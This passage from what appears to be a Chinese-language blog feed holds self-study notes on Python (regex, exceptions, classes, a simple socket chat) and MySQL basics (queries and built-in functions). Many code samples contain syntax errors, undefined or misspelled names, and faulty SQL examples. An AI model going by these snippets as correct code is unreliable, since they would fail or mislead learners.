=> {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自学day4</title>
      <link href="/2020/08/01/pyday4/"/>
      <url>/2020/08/01/pyday4/</url>
      
        <content type="html"><![CDATA[<h3 id="findall发现所有"><a href="#findall发现所有" class="headerlink" title="findall发现所有"></a>findall发现所有</h3><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    #.匹配任意字符一次  .*是所有的字符    print(re.findall('a.b','ab aab acb a2b a*b'))    passif __name__=='__main__':    main()</code></pre><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    #.匹配任意字符一次  .*是所有的字符    #search是匹配第一次匹配到的东西，group()只输出匹配到内容    print(re.search('a.b','ab aab acb a2b a*b').group())    passif __name__=='__main__':    main()</code></pre><h3 id="match完全匹配"><a href="#match完全匹配" class="headerlink" title="match完全匹配"></a>match完全匹配</h3><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    #.匹配任意字符一次  .*是所有的字符    #match是从头开始匹配，相当于search ^xxx    print(re.match('a.b','ab aab acb a2b a*b'))    passif __name__=='__main__':    main()</code></pre><h3 id="sub替换"><a href="#sub替换" class="headerlink" title="sub替换"></a>sub替换</h3><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    print(re.sub('abc','NNN',sadfdsgabcasdas'))    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    #任意数字出现两遍    obj = re.compile('\d{2}')   #对正则表达式进行编译    以下内容用obj代替正则表达式    print(obj.search('sadad123abchahaha').group())    print(obj.findall('asdsd123abchahaha'))    passif __name__=='__main__':    main()</code></pre><hr><h3 id="正则表达式的遍历"><a href="#正则表达式的遍历" class="headerlink" title="正则表达式的遍历"></a>正则表达式的遍历</h3><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    ret = re.finditer('\d','abc123cde456')    #内存地址    print(ret)    #把正则匹配的东西编程迭代器    print(next(ret).group())    print(next(ret).group())    print([i.group() for i in ret])    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#-*- coding=utf-8 -*-import re #导入正则表达式模块def main():    str = 'asdsafas&lt;h1&gt;haha&lt;/h1&gt;safdssgdsggs&lt;div&gt;nihao&lt;/div&gt;sad'    s1 = r'(&lt;\w&gt;)\w+&lt;/\1&gt;'    #ret = re.search(s1,str)    #print(ret)    #列表推导式    ret = re.finditer(s1,str)    print(next(ret).group())    print(next(ret).group())    passif __name__=='__main__':    main()</code></pre><hr><p>在文件所在目录下新建a.txt<br>输入abcd<br>再建b.txt<br>输入1234</p><pre><code>#-*- coding=utf-8 -*-import shutildef main():    #文件打开后追加    shutil.copyfileobj(open('./a.txt','r'),open('./b.txt','a'))    #剪切文件    shutil.move('./a.txt','c:/123.txt')    passif __name__=='__main__':    main()</code></pre><hr><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p><strong>语法错误</strong></p><p><strong>逻辑错误</strong></p><p>例：</p><pre><code>#-*- coding=utf-8 -*-def main():    #try里面是可能出错的代码    try:        while x:            print('haha')    #如果出现就执行    except:        print("你错了")    passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-def main():    try:        f.open("./x.txt","r")        print(f.read())    except:        print("没有此文件")    #不管报错不报错,finally都执行    finally:        print("不管怎么样，我都执行")        f.close()    passif __name__=='__main__':    main()</code></pre><hr><h3 id="精确捕获"><a href="#精确捕获" class="headerlink" title="精确捕获"></a>精确捕获</h3><pre><code>#-*- coding=utf-8 -*-def main():#精确去捕获错误    try:        a = "python"        print(a)        print(a.index("y"))        b = 1/0    except NameError:        print("捕获到NameError")    except ValueError:        print("捕获到ValueError")    except ZeroDivisionError:        print("捕获到ZeroDivisionError")    except Exception:#没有被预料到的错误        print("未知错误")    passif __name__=='__main__':    main()</code></pre><hr><h3 id="创造异常"><a href="#创造异常" class="headerlink" title="创造异常"></a>创造异常</h3><pre><code>#-*- coding=utf-8 -*-def main():    x = 1    y = 0    if y == 0        raise ValueError("请充值")    passif __name__=='__main__':    main()</code></pre><hr><h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><p>面向过程编程，面向函数编程，面向对象编程</p><pre><code>#-*- coding=utf-8 -*-#定义一个人类class Human:    name = 'no name now'    mind = '我有思想'    money = 0    #self无实意，仅表示该类的医院    def work(self):        print("我可以工作")        pass    def run(self,x)        print('running:',x)def main():    ren1 = Human()    #ren2 = Human()    #ren2.name = "name2"    #print(ren2.name)    print(ren1.mind)    ren1.work    ren1.run(30)    print(ren1.name)    ren1.name = "name1"    print(ren1.name)    passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-class Ren:    name = 'name1'    age = 20    sex = 'none'    #__是私有变量，只能类内访问    __bag = 'weapen'    @classmethod #装饰器，加上去之后，Ren.run(20)可以直接调用    def run(self,x):        print("running:",x)        print("i have",self.__bag)        pass    #构造函数,当类被初始化的时候，构造函数就执行    #可以增加初始化参数    def __init__(self,name,sex)        print("这个人被制造出来了")        self.name = name        self.sex = sex        pass    #析构函数，当类消亡，析构函数就会执行    def __del__(self)        print("我死了")        pass    #类种类，内部类    class Bad:        name = 'bad person'        def badman(self):            print("kill you")            pass        def __init__(self)            print("坏人被制造出来了")            pass        #析构函数，当类消亡，析构函数就会执行        def __del__(self)            print("我被枪毙了")            pass#定义子类，继承父类class childRen(Ren):    def __init__(self)        print("孩子被制造出来了")        pass    #析构函数，当类消亡，析构函数就会执行    def __del__(self)        print("孩子死了")        pass    #继承父类方法    def pao(self,x):        super().run(x)def main():    ren1 = Ren("xiaoming","boy")    #ren1.run(30)    print(ren1.name)    ren1.run(20)    #也会执行构造函数    ren2.Ren()    ren3 = Ren.Bad()    ren3.bandman()    ren4 = childRen()    ren4.pao(30)    print(ren4.name)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="类的依赖关系"><a href="#类的依赖关系" class="headerlink" title="类的依赖关系"></a>类的依赖关系</h3><pre><code>#-*- coding=utf-8 -*-class Elephant:    def __init__(self,name):    self.name = name    pass    #obj1是要传入一个实例化后的对象，并且调用obj1这个对象的open_door方法    def open(self,obj1)    print(self.name,"我要开门了"    obj1.open_door())    pass    def close(self)    passclass Refrigerator    def open_door(self)        print("冰箱开门")        pass    def close_door(self)        print("冰箱关门")        passdef main():    el = Elephant("大象")    haier = Refrigerator()    el.open(haier)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="类的关联"><a href="#类的关联" class="headerlink" title="类的关联"></a>类的关联</h3><pre><code>#-*- coding=utf-8 -*-class Boy:    def __init__(self,name,girlFriend=None):    self.name = name    self.girlFriend = girlFriend    pass    def hava_a_dinner(self):    if self.girlFriend        print("%s和%s一起吃饭"%(self.name,self.girlFriend.name))    else:        print("一个人吃")    passclass Girl    def __init__(self,name)    self.name = name    passdef main():    boy1 = Boy("小李")    boy1.hava_a_dinner()    girl1 = Girl("小红")    #关联    boy2 = Boy("小王",girl1)    boy2.hava_a_dinner()    passif __name__=='__main__':    main()</code></pre><h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><h3 id="类的组合"><a href="#类的组合" class="headerlink" title="类的组合"></a>类的组合</h3><pre><code>#-*- coding=utf-8 -*-class Gamerole    def __init__(self,name,ad,hp)        self.name = name        self.ad = ad        self.hp = hp        pass    def attack(self,p1):        p1.hp -= self.ad        print("%s 攻击了 %s , %s 掉了 %s 学， 还剩%s 血"%(self.name,p1.name,p1.name,self.ad,p1.hp))        pass    #定义一个武器类，拿起来什么武器    def equip_weapen(self,wea):        self.wea = weaclass Weapen:    def __init__(self,name,ad):        self.name = name        self.ad = ad        pass    def weapen_attack(self,p1,p2)        p2.hp = p2.hp - self.ad - p1.ad        print("%s利用了%s攻击了%s,%s还剩%s血"%(p1.name,self.name,p2.name,p2.name,p2.hp))        passdef main():    player1 = Gamerole("王家1",10,100)    player2 = Gamerole("玩家2",25,200)    gun = Weapen("手枪",40)    player1.equip_weapon(gun)    #普通攻击    player1.attach(player2)    player1.wea.weapon_attack(player1,player2)    passif __name__=='__main__':    main()</code></pre><h3 id="类的约束"><a href="#类的约束" class="headerlink" title="类的约束"></a>类的约束</h3><pre><code>#-*- coding=utf-8 -*-#完善#没有使用规定的方法，会报错class Payment:    #我就负责指定标准，谁继承我，必须有这些方法    def pay(self,money):        raise Exception('你没有实现我规划的方法')class QQpay(Payment):    def pay(self,money):        print("使用QQ支付付了",money)        passclass Alipay(Payment):    def pay(self,money)        print("使用支付宝支付了",money)class Wechat(Payment):    def pay(self,money)        print("使用微信支付了",money)def pay(obj,money):    obj.pay(money)def main():    a = Alipay()    b = Wechatpay()    pay(a,100)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="特殊的方法"><a href="#特殊的方法" class="headerlink" title="特殊的方法"></a>特殊的方法</h3><pre><code>#-*- coding=utf-8 -*-class A:    name - "name1"    def fun1(self):        print("i am class A-fun1")        pass    def __fun2(self)        print("i am private fun2")        pass    @staticmethod #静态方法,不能有任何参数    def fun3():        print("i am fun3")        pass    @property #不能有参数    def fun4(self):        print("i am fun4")        passdef main():    a = A()    print(a.fun4) #调用property不需要括号    passif __name__=='__main__':    main()</code></pre><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><pre><code>#-*- coding=utf-8 -*-class Student:    __num = 0    def __init__(self,name,age):        self.name = name        self.age = age        Student.addNum()        pass    @classmethod #类内可以使用，无需实例化    def addNum(self):        self.__num +=1        pass    @classmethod      def getNum(self):        return self.__num        passdef main():    Student("A",20)    Student("AB",21)    Student("ABC",22)    print(Student.getNum())    passif __name__=='__main__':    main()</code></pre><hr><pre><code>#-*- coding=utf-8 -*-class Goods    def __init__(self):        #原价        self.original_price = 100        #折扣        self.discount = 0.8        pass    @property    def price(self):        #实际价格        new_price = self.original_price * self.discount        return new_price        pass    @price.setter  #如果obj.price = 200有接收参数，舅用setter去接受，此时默认的original_就被修改    def price(self,value):        self.original_orice = value        pass    @price.deleter    def price(self):        del self.original_pricedef main():    obj = Goods()    print(obj.price)    obj.price = 200 #property修饰的函数加了参数，向下寻找以他为修饰符的setter运行    print(obj.price)    del obj.price #执行deleter    passif __name__=='__main__':    main()</code></pre><h3 id="对象反射"><a href="#对象反射" class="headerlink" title="对象反射"></a>对象反射</h3><pre><code>#-*- coding=utf-8 -*-class Foo(object):    f = "haha"    def __init__(self,name,age):        self.name = name        self.age = age    def say_hi(self):        print("hi")        passdef main():    obj = Foo("xiaoming",20)    #检查是否有某些函数    print(hasattr(obj,"say_hi"))    #获取方法，获取的是内存地址    n = getattr(obj,"say_hixxx","这个方法不存在")    print(n)    #删除属性    delattr(obj,"f")    #print(obj.f)    #报错，因为f不存在    #设置属性    setattr(obj,'sb',True)    print(obj.sb)    passif __name__=='__main__':    main()</code></pre><hr><pre><code>class B:    def __len__(self):        return 666        passdef __call__(self,*args,**kwargs):    print("calling")    passdef main():    b = B()    print(len(b))   #len原本表示测试一个长度，出发__len__方法    b() #直接执行实例化后的东西，就执行__call__里面的方法    passif __name__=='__main__':    main()</code></pre><h2 id="网络编程："><a href="#网络编程：" class="headerlink" title="网络编程："></a>网络编程：</h2><p>套接字！：进程用套接字和操作系统通信</p><p>af_nuix(af_inet)</p><p>套接字是一个协议，支持TCP和UDP</p><p>网络通信是拿到别人的套接字，然后给他发信息</p><p>新建两个客户端，client.py和server.py</p><pre><code>#服务端#-*- coding=utf-8 -*-import socket #套接字def main():    #导入socket模块    s = socket.socket()    #获取自己的ip地址    host = socket.gethostname()    #用此端口通信    port = 12345    #绑定端口    s.bind((host,port))    #等待客户连接，最多五个人    s.listen(5)    #建立和客户端的连接    c,addr = s.accept()    #获取客户的ip地址    print("连接地址:",addr)    #发送信息给客户    c.send("welcome".encode("utf-8"))    接受客户信息    print(c.recv(1024).decode("utf-8"))    #关闭通信    c.close()    passif __name__=='__main__':    main()</code></pre><p>客户端</p><pre><code>#客户端#-*- coding=utf-8 -*-import socketdef main():    s = socket.socket()    host = '你的ip地址'    port = 12345    #连接服务器    s.connect((host,port))    while True:        msg = input("发送信息:")        #发送信息        s.send(msg.encode("utf-8"))        print(s.recv(1024).decode("utf-8"))    s.close()    passif __name__=='__main__':    main()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基础</title>
      <link href="/2020/04/13/shu-ju-ku-1/"/>
      <url>/2020/04/13/shu-ju-ku-1/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库(1)"></a>数据库(1)</h1><h2 id="数据库的好处"><a href="#数据库的好处" class="headerlink" title="数据库的好处"></a>数据库的好处</h2><ol><li>持久化数据到本地</li><li>可以实现结构化查询，方便管理</li></ol><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><ol><li>DB：数据库，保存一组有组织的数据的容器</li><li>DBMS：数据库管理系统，又称为数据库软件（产品），用于管理DB中的数据</li><li>SQL：结构化查询语言，用于和DBMS通信的语言</li></ol><h2 id="数据库存储数据的特点"><a href="#数据库存储数据的特点" class="headerlink" title="数据库存储数据的特点"></a>数据库存储数据的特点</h2><ol><li>将数据放到表中，表再放到库中</li><li>一个数据中可以有多个表，每个表都有一个的名字，用来标识自己。表名具有唯一性</li><li>表具有一些特性，这些特性定义了数据在表中如何存储，类似java中的”类”的设计。</li><li>表由列组成，我们也称为字段。所有表都是由一个或多个列组成，每一列类似java中的”属性”</li><li>表中的数据是按行存储的，每一行类似于java中的”对象”</li></ol><h2 id="Mysql服务的启动和停止"><a href="#Mysql服务的启动和停止" class="headerlink" title="Mysql服务的启动和停止"></a>Mysql服务的启动和停止</h2><p><strong>方式一</strong>：计算机-右击管理-服务</p><p><strong>方式二</strong>：通过管理员身份运行</p><p>net start 服务名（启动服务）</p><p>net stop 服务名（停止服务）</p><h2 id="Mysql服务的登录和退出"><a href="#Mysql服务的登录和退出" class="headerlink" title="Mysql服务的登录和退出"></a>Mysql服务的登录和退出</h2><p><strong>方式一</strong>：通过mysql自带的客户端</p><p>只限于root用户</p><p><strong>方式二</strong>：通过windows自带的客户端</p><p><strong>登录</strong>：</p><p>mysql    [-h主机名    -P端口号]    -u用户名    -p密码    </p><p><strong>退出</strong>：</p><p>exit或Ctrl+C</p><h2 id="Mysql常见命令"><a href="#Mysql常见命令" class="headerlink" title="Mysql常见命令"></a>Mysql常见命令</h2><ol><li><p>查看当前所有的数据库</p><p><strong>show databases;</strong></p></li><li><p>打开指定的库</p><p><strong>use 库名</strong></p></li><li><p>查看当前库的所有表</p><p><strong>show tables;</strong></p></li><li><p>查看其它库的所有表</p><p><strong>show tables from 库名;</strong></p></li><li><p>创建表</p><p><strong>create table 表名(</strong></p><p>​        <strong>列名 列类型,</strong></p><p>​        <strong>列名 列类型,</strong></p><p>​        <strong>…… …………</strong></p><p><strong>);</strong></p></li><li><p>查看表结构</p><p><strong>desc 表名</strong>;</p></li><li><p>查看服务器版本</p><p><strong>方式一</strong>：登录到mysql服务端</p><p>select version();</p><p><strong>方式二</strong>：没有登陆到mysql服务端</p><p>mysql –version或mysql –V</p></li></ol><h2 id="mysql的语法规范"><a href="#mysql的语法规范" class="headerlink" title="mysql的语法规范"></a>mysql的语法规范</h2><ol><li><p>不区分大小写，建议我们关键字大写，表名、列名小写</p></li><li><p>每条命令最好用分号结尾</p></li><li><p>每条命令根据需要，可以进行缩进或换行</p></li><li><p>注释</p><p>单行注释：#注释文字  </p><p>单行注释：– 注释文字（中间有空格）多行注释：/* 注释文字 */</p></li></ol><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><h3 id="1-基础查询"><a href="#1-基础查询" class="headerlink" title="1.基础查询"></a>1.基础查询</h3><p>语法：</p><p><strong>select 查询列表 from 表名；</strong></p><blockquote><p>1.查询列表可以是：表中的字段、常量值、表达式、函数</p><p>2.查询的结果是一个虚拟的表格</p></blockquote><h4 id="1-查询表中的单个字段"><a href="#1-查询表中的单个字段" class="headerlink" title="1.查询表中的单个字段"></a>1.查询表中的单个字段</h4><pre class=" language-mysql"><code class="language-mysql">SELECT name from employess;</code></pre><h4 id="2-查询表中的多个字段"><a href="#2-查询表中的多个字段" class="headerlink" title="2.查询表中的多个字段"></a>2.查询表中的多个字段</h4><pre class=" language-mysql"><code class="language-mysql">SELECT name,salary,email FROM employess;</code></pre><h4 id="3-查询表中的所有字段"><a href="#3-查询表中的所有字段" class="headerlink" title="3.查询表中的所有字段"></a>3.查询表中的所有字段</h4><pre class=" language-mysql"><code class="language-mysql">SELECT * FROM employess;</code></pre><blockquote><p>不足：表中字段的顺序跟原始表一摸一样</p><p><strong>``</strong>为着重号（键盘数字1左面），可以进行标识</p></blockquote><h4 id="4-查询常量"><a href="#4-查询常量" class="headerlink" title="4.查询常量"></a>4.查询常量</h4><pre class=" language-mysql"><code class="language-mysql">SELECT 100;</code></pre><h4 id="5-查询表达式"><a href="#5-查询表达式" class="headerlink" title="5.查询表达式"></a>5.查询表达式</h4><pre class=" language-mysql"><code class="language-mysql">SELECT 100%98;</code></pre><h4 id="6-查询函数"><a href="#6-查询函数" class="headerlink" title="6.查询函数"></a>6.查询函数</h4><pre class=" language-mysql"><code class="language-mysql">SELECT version();</code></pre><h4 id="7-起别名"><a href="#7-起别名" class="headerlink" title="7.起别名"></a>7.起别名</h4><p>方式1：SELECT 100%98 AS 结果;</p><p>方式2：AS省略，使用空格</p><p>​                SELECT 100%98  结果;</p><h4 id="8-去重"><a href="#8-去重" class="headerlink" title="8.去重"></a>8.去重</h4><pre class=" language-mysql"><code class="language-mysql">SELECT DISTINCT id FROM employess;</code></pre><h4 id="9-号的作用"><a href="#9-号的作用" class="headerlink" title="9.+号的作用"></a>9.+号的作用</h4><p>查询名字和姓连接成一个字段，显示为 姓名</p><blockquote><p>/*</p><p>java中+号</p><ol><li>运算符，两个操作数都为数值型</li><li>连接符，只要有一个操作数为字符串</li></ol><p>mysql中的+号：</p><p>直至只有一个功能：<strong>运算符</strong></p><p>select    100+90;两个操作数都为数值型，则做加法运算</p><p>select    ‘123’+90;其中一方为字符型，试图将字符型数值转换为数值型，如果转换成功则继续做加法运算，如果转换失败则将字符型转换成0</p><p>select    ‘john’+90;</p><p>select null+10;只要其中一方为null则结果肯定为null</p><p>*/</p></blockquote><blockquote><p>SELECT  last_name_+first_name  AS  姓名  from  employess</p><p>执行之后值都为0，拼接失败</p></blockquote><pre class=" language-mysql"><code class="language-mysql">SELECT CONCAT('a','b','c') AS 结果;</code></pre><p>所以将上表修改为</p><pre class=" language-mysql"><code class="language-mysql">SELECT CONCAT(last_name,first_name) AS 姓名FROM employess;</code></pre><h3 id="2-条件查询"><a href="#2-条件查询" class="headerlink" title="2.条件查询"></a>2.条件查询</h3><p>语法：</p><pre class=" language-mysql"><code class="language-mysql">select 查询列表 ③from 表名 ①where 筛选条件 ②</code></pre><p>分类：</p><p>一、按条件表达式筛选</p><p>​        条件运算符：<strong>&gt;   &lt;   =   !=(&lt;&gt;)    &lt;=   &gt;=</strong></p><p>二、按逻辑表达式筛选</p><p>​        逻辑运算符：<strong>&amp;&amp;    ||    ！</strong></p><p>​                                <strong>and    or    not</strong></p><p>三、模糊查询</p><p>​        <strong>like            between  and                in                is  null</strong></p><h4 id="1-按条件表达式筛选"><a href="#1-按条件表达式筛选" class="headerlink" title="1.按条件表达式筛选"></a>1.按条件表达式筛选</h4><p>工资大于12000的员工</p><pre class=" language-mysql"><code class="language-mysql">SELECT     *FROM     employeesWHERE     salary>12000;</code></pre><h4 id="2-按逻辑表达式筛选"><a href="#2-按逻辑表达式筛选" class="headerlink" title="2.按逻辑表达式筛选"></a>2.按逻辑表达式筛选</h4><p>工资在10000到20000之间的员工名和工资</p><pre class=" language-mysql"><code class="language-mysql">SELECT        name,salaryFROM     employessWHERE     salary>10000 AND salary<20000</code></pre><h4 id="3-模糊查询"><a href="#3-模糊查询" class="headerlink" title="3.模糊查询"></a>3.模糊查询</h4><p>/*</p><p><strong>like</strong></p><p><strong>between  and</strong></p><p><strong>in</strong></p><p><strong>is  null</strong></p><p>*/</p><h5 id="1-like"><a href="#1-like" class="headerlink" title="1.like"></a>1.like</h5><p>查询员工名中包含a的员工信息</p><pre class=" language-mysql"><code class="language-mysql">SELECT    *FROM    employeesWHERE    name LIKE '%a%';//%为通配符</code></pre><p>特点：</p><ul><li>一般和通配符搭配使用</li><li>%为任意多个字符（包含0个字符）</li><li>_为任意单个字符</li></ul><pre class=" language-mysql"><code class="language-mysql">//查询员工第三个字符为e，第五个字符为a的员工名和工资SELECT    name,    salaryFROM    employeesWHERE    name LIKE '__e_a%'</code></pre><pre class=" language-mysql"><code class="language-mysql">//查询员公名中第二个字符为_的员工名SELECT    nameFROM    employeesWHERE    name LIKE '_$_%' ESCAPE '$';</code></pre><h5 id="2-between-and"><a href="#2-between-and" class="headerlink" title="2.between and"></a>2.between and</h5><p>查询员工编号在100到120之间的员工信息</p><pre class=" language-mysql"><code class="language-mysql">SELECT    *FROM    employeesWHERE    employee_id BETWEEN 100 AND 120;</code></pre><p>特点：提高简洁度，包含临界值，两个临界值不要调换顺序。</p><h5 id="3-in关键字"><a href="#3-in关键字" class="headerlink" title="3.in关键字"></a>3.in关键字</h5><p>查询员工的工种编号是IT，AD中的一个员工名和工种编号</p><pre class=" language-mysql"><code class="language-mysql">SELECT    name    job_idFROM    employeesWHERE    job_id IN('IT','AD');</code></pre><p>特点：判断某字段的值是否属于in列表中的某一项，提高简洁度</p><p>in列表的值类型必须统一或兼容</p><h5 id="4-is-null"><a href="#4-is-null" class="headerlink" title="4.is null"></a>4.is null</h5><p>查询没有奖金的员工名和奖金率</p><pre class=" language-mysql"><code class="language-mysql">SELECT    name,    commissionFROM    employeesWHERE    commission IS NULL;//有奖金为IS NOT NULL</code></pre><p>=或&lt;&gt;不能用于判断null值，is null可以进行判断<strong>null值</strong></p><p><strong>补</strong>：安全等于&lt;=&gt;，可以判断null值</p><pre class=" language-mysql"><code class="language-mysql">SELECT    name,    commissionFROM    employeesWHERE    commission <=>NULL;</code></pre><h3 id="3-排序查询"><a href="#3-排序查询" class="headerlink" title="3.排序查询"></a>3.排序查询</h3><pre><code>SELECT    查询列表FROM    表(WHERE    筛选条件)ORDER BY    排序列表（asc|desc）</code></pre><p>案例1：查询员工信息，要求工资从高到低排序</p><pre class=" language-mysql"><code class="language-mysql">SELECT *FROM employeesORDER BY salary DESC;</code></pre><blockquote><p>ASC可以省略</p></blockquote><p><strong>asc代表升序，desc代表降序</strong></p><p>案例2：查询部门编号&gt;=90的员工信息，按入职时间的先后进行排序</p><pre class=" language-mysql"><code class="language-mysql">SELECT    *FROM    employeesWHEREdepartment_id>=90ORDER BY hiredate ASC;</code></pre><p>案例3：按年薪的高低显示员工的信息和年薪（按表达式排序或者别名排序）</p><pre class=" language-mysql"><code class="language-mysql">SELECT    *,salary*12*(1+IFNULL(commission,0))FROM    employeesORDER BY     salary*12*(1+IFNULL(commission,0)) DESC//或者 年薪 DESC</code></pre><p>案例4：按姓名的长度显示员工的姓名和工资（按函数排序）</p><pre class=" language-mysql"><code class="language-mysql">SELECT    LENGTH(name) 字节长度, name,salaryFROM    employeesORDER BY     LENGTH(name) DESC</code></pre><p>案例5：查询员工信息，要求先按工资排序，再按员工编号排序</p><pre class=" language-mysql"><code class="language-mysql">SELECT    *FROM    employeesORDER BY     salary ASC,employee_id DESC;</code></pre><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><blockquote><p>功能：类似于java中的方法，将一组逻辑语句封装在方法体中，对外暴露方法名</p><p>好处：</p><p>1.隐藏了实现细节</p><p>2.提高代码的重用性</p><p>调用：select    函数名(实参列表)    from    表;</p><p>特点：</p><ol><li>叫什么（函数名）</li><li>干什么（函数功能）</li></ol><p>分类：</p><ol><li><p>单行函数</p><p>如concat、length、ifnull等</p></li><li><p>分组函数</p><p>功能：做统计使用，又称为统计函数、聚合函数、组函数</p></li></ol></blockquote><h3 id="1-字符函数"><a href="#1-字符函数" class="headerlink" title="1.字符函数"></a>1.字符函数</h3><p><strong>1.length</strong></p><blockquote><p>length 获取参数值的字节个数</p></blockquote><pre class=" language-mysql"><code class="language-mysql">SELECT LENGTH('张三峰hahaha');//占15个字节，1个英文字母占一个字节，一个汉字占三个字节</code></pre><p><strong>2.concat</strong></p><blockquote><p>concat 拼接字符串</p></blockquote><pre class=" language-mysql"><code class="language-mysql">SELECT CONCAT(last_name,'_',first_name) FROM employees;//效果为姓与名之间有_</code></pre><p><strong>3.upper、lower</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT UPPER('joHn');//变大写SELECT LOWER('joHn');//变小写</code></pre><p>例：将姓变大写，名变小写，然后拼接</p><pre class=" language-mysql"><code class="language-mysql">SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名FROM employees;</code></pre><p><strong>4.substr、substring</strong></p><blockquote><p>截取字符串</p><p>注意索引从1开始</p><p>substr有4个重载</p></blockquote><p>例：</p><pre class=" language-mysql"><code class="language-mysql">//输出为陆展元，mysql第一个符号为1//截取从指定索引处后面所有字符SELECT SUBSTR('李莫愁爱上了陆展元',7) output;//截取从指定索引处指定字符长度的字符SELECT SUBSTR('李莫愁爱上了陆展元',1,3) output;</code></pre><p><strong>案例1:姓名中首字符大写，其他字符小写然后用_拼接，显示出来</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT CONCAT(UPPER(SUBSTR(last_ name,1,1)),'_', LOWER(SUBSTR(last_ name,2) )) out_ putFROM employees;</code></pre><p><strong>5.instr</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT INSTR('杨不悔爱上了殷六侠') AS outputFROM employees;//执行后显示7，返回子串第一次出现的索引，如果找不到返回0</code></pre><p><strong>6.trim</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT LENGTH(TRIM('    张翠山     ')) AS output;//去掉空格SELECT TRIM('a' FROM 'aaaaaaaaa张aaaaa翠山aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')AS out_ _put;//去掉a字符，但是张和翠山之间的字符为有效字符不能去掉</code></pre><p><strong>7.lpad与rpad</strong></p><pre class=" language-mysql"><code class="language-mysql">//用指定的字符实现左填充指定长度，结果为殷素SELECT LPAD('殷素素',2,'*')AS out_ _put;//用指定的字符实现右填充指定长度，输出为素素SELECT RPAD('殷素素',2,'*')AS out_ _put;</code></pre><p><strong>8.replace替换</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT REPLACE('张无忌爱上了周芷若',"周芷若','赵敏')AS out_ _put;//输出为张无忌爱上了赵敏</code></pre><p>###2.数学函数</p><p><strong>1.round四舍五入</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT ROUND(-1.55);//-2SELECT ROUND(1.567,2);//1.57</code></pre><p><strong>2.ceil向上取整，返回大于等于该参数的最小整数</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT CEIL(1.02);//2SELECT CEIL(-1.02);//-1</code></pre><p><strong>3.floor，向下取整</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT FLOOR(-9.99);//-10</code></pre><p><strong>4.truncate截断</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT TRUNCATE (1.69999，1);//输出1.6</code></pre><p><strong>5.mod取余</strong></p><p>SELECT MOD(-10,-3);    //得-1</p><p>//mod (a,b)        :        a-a/b*b</p><h3 id="3-日期函数"><a href="#3-日期函数" class="headerlink" title="3.日期函数"></a>3.日期函数</h3><p><strong>1.now 返回当前系统日期和时间</strong></p><p>SELECT now();</p><p><strong>2.curdate    返回当前系统日期，不包含时间</strong></p><p>SELECT CURDATE();</p><p><strong>3.curtime    返回当前时间，不包含日期</strong></p><p>SELECT    CURTIME();</p><p><strong>4.可以获取指定的部分，年、月、日、小时、分钟、秒.</strong></p><p>SELECT    YEAR(NOW())    年;</p><p>SELECT    YEAR(‘1998-1-1’)    年;//1998</p><p>SELECT    MONTHNAME(NOW() )    月;//返回当前月</p><p>日期表：</p><p><img src="C:%5CUsers%5C%E5%96%86%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200421113538039.png" alt="image-20200421113538039"></p><p><strong>6.str_to__date将字符通过指定的格式转换成日期</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT    STR_ TO_ DATE('1998-3-2', '%Y-%c-%d')    AS    out_ _put;</code></pre><p><strong>#查询入职日期为1992–4-3的员工信息</strong></p><pre class=" language-mysql"><code class="language-mysql">SELECT    *    FROM    employees    WHERE    hiredate    ='1992-4-3';SELECT    *    FROM    employees    WHERE    hiredate    = STR_ TO DATE('4-3 1992','%c-%d    %Y') 